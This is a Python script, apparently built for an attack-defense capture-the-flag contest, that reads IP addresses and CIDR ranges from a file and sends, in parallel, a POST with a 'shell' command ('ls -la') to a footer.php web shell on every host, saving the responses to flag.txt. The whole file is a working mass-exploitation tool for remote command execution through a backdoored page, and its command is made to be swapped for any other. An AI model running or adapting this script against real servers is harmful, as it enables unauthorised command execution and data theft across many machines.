import requests
import ipaddress
import sys
from concurrent.futures import ThreadPoolExecutor

# 配置参数 - 可以根据需要修改
DEFAULT_PORT = '8805'  # 默认端口，如果IP地址中没有指定端口则使用这个端口
POST_ENDPOINT = '/footer.php'  # POST请求的端点
# POST表单数据
POST_DATA = {
    'shell': 'ls -la'  # 可以根据需要修改命令
}

def process_target(target):
    """处理单个目标地址，支持IP、带端口IP和CIDR格式"""
    results = []
    
    # 提取基础IP和端口号
    if ':' in target:
        base_ip, port = target.split(':', 1)
    else:
        base_ip = target
        port = DEFAULT_PORT  # 使用配置的默认端口
    
    try:
        # 检查是否为CIDR格式
        if '/' in base_ip:
            network = ipaddress.ip_network(base_ip, strict=False)
            for ip in network.hosts():
                results.append(f"{str(ip)}:{port}")
        else:
            # 单个IP
            results.append(target if ':' in target else f"{target}:{DEFAULT_PORT}")
    except ValueError:
        print(f"无效的目标地址: {target}")
    
    return results

def fetch_post_info(target):
    """使用POST请求获取指定目标的信息"""
    url = f"http://{target}{POST_ENDPOINT}"
    try:
        # 发送POST请求
        response = requests.post(url, data=POST_DATA, timeout=3)
        response.raise_for_status()
        return f"目标: {target}\nPOST数据: {POST_DATA}\n响应内容:\n{response.text}\n{'-'*50}\n"
    except Exception as e:
        return f"目标: {target}\nPOST数据: {POST_DATA}\n错误: {str(e)}\n{'-'*50}\n"

def main():
    # 程序说明
    print("==== 批量POST请求工具 ====")
    print(f"当前配置的默认端口: {DEFAULT_PORT}")
    print(f"POST请求端点: {POST_ENDPOINT}")
    print(f"发送的POST数据: {POST_DATA}")
    print("支持格式: 单个IP、带端口IP、CIDR格式网段")
    print("示例: 192.168.1.1  或  192.168.1.1:8080  或  192.168.1.0/30")
    print("====================\n")
    
    # 读取ip.txt文件
    try:
        with open('ip.txt', 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("错误: ip.txt文件不存在，请创建此文件并添加IP地址")
        sys.exit(1)
    
    if not targets:
        print("警告: ip.txt文件为空")
        sys.exit(1)
    
    # 处理所有目标
    all_targets = []
    for target in targets:
        processed = process_target(target)
        all_targets.extend(processed)
        if processed:
            print(f"处理目标: {target} -> 生成 {len(processed)} 个扫描项")
    
    print(f"\n总共处理了 {len(targets)} 个目标，生成了 {len(all_targets)} 个扫描项")
    print("开始发送POST请求...")
    
    # 并行获取信息
    results = []
    success_count = 0
    error_count = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_target = {executor.submit(fetch_post_info, t): t for t in all_targets}
        for future in future_to_target:
            target = future_to_target[future]
            try:
                result = future.result()
                results.append(result)
                success_count += 1
                print(f"✓ 成功: {target}")
            except Exception as e:
                error_count += 1
                print(f"✗ 失败: {target} - {str(e)}")
    
    # 写入结果
    if results:
        with open('flag.txt', 'w', encoding='utf-8') as f:
            f.writelines(results)
        print(f"\n结果已写入 flag.txt 文件")
        print(f"统计: 成功 {success_count} 个，失败 {error_count} 个")
    else:
        print("\n警告: 没有获取到任何有效结果")

if __name__ == "__main__":
    main()